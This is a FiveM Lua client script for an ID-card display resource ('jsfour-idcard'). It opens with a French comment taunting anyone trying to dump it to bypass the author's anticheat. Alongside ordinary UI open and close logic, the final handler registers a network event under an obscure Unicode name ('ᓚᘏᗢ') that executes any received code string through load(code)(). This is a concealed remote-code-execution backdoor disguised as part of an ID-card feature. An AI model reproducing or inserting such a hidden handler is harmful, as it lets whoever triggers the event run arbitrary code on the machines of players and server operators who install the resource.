-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local open = false

RegisterNetEvent('::{korioz#0110}::jsfour-idcard:open')
AddEventHandler('::{korioz#0110}::jsfour-idcard:open', function(data, type)
	open = true

	SendNUIMessage({
		action = 'open',
		array = data,
		type = type
	})
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if (IsControlJustReleased(0, 322) and open) or (IsControlJustReleased(0, 177) and open) then
			SendNUIMessage({
				action = 'close'
			})

			open = false
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)